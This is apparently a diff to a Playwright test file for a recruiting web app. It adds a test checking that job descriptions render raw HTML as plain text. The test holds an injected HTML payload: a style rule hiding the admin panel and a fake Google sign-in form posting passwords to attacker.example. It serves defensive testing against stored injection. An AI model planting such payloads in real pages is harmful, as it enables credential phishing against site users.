@@ -353,6 +353,41 @@ test.describe('the recruiter', () => {
 		await expect(page.getByRole('heading', { name: 'Job description not found' })).toBeVisible();
 	});
 
+	// JobDetails renders the Markdown without raw HTML (html={false}), here and on the job's
+	// private page (job-view.test.ts)
+	test('a description shows its raw HTML as text: it cannot restyle the page or add a form', async ({
+		page
+	}) => {
+		const description = [
+			'## The job',
+			'',
+			'Sign in again below.',
+			'<style>aside[aria-label="Manage this job description"]{display:none!important}</style>',
+			'<form action="https://attacker.example/collect" method="post"><label>Google password <input name="password" type="password"></label><button>Sign in with Google</button></form>',
+			'',
+			'Inline <span style="position:fixed;inset:0;background:red">cover</span> text.'
+		].join('\n');
+		const { _id: id } = await createJob(api, {
+			title: `Sales lead ${tag}`,
+			status: 'open',
+			description
+		});
+
+		await openAsRecruiter(page, `/recruiter/jobs/${id}`);
+
+		await expect(
+			page.getByRole('complementary', { name: 'Manage this job description' })
+		).toBeVisible();
+		await expect(page.locator('form[action^="https://attacker.example"]')).toHaveCount(0);
+		await expect(page.locator('input[type="password"]')).toHaveCount(0);
+		await expect(page.getByRole('button', { name: 'Sign in with Google' })).toHaveCount(0);
+		await expect(
+			page.getByText('<form action="https://attacker.example/collect"', { exact: false })
+		).toBeVisible();
+		// Its headings rank right under "About the job" (h3): an h4, not an h5
+		await expect(page.getByRole('heading', { level: 4, name: 'The job' })).toBeVisible();
+	});
+
 	test('freezes the fields while saving, and never saves over changes made elsewhere', async ({
 		page
 	}) => {
@@ -362,7 +397,7 @@ test.describe('the recruiter', () => {
 		const titleInput = page.getByRole('textbox', { name: 'Job title' });
 		await expect(titleInput).toHaveValue(title);
 
-		// Published from another tab meanwhile: the editor still shows the draft
+		// Opened from another tab meanwhile: the editor still shows the draft
 		const opened = await api.put(`${API_URL}/jobs/${id}/status`, { data: { status: 'open' } });
 		expect(opened.ok()).toBe(true);
 		await titleInput.fill(`${title} (typo fixed)`);
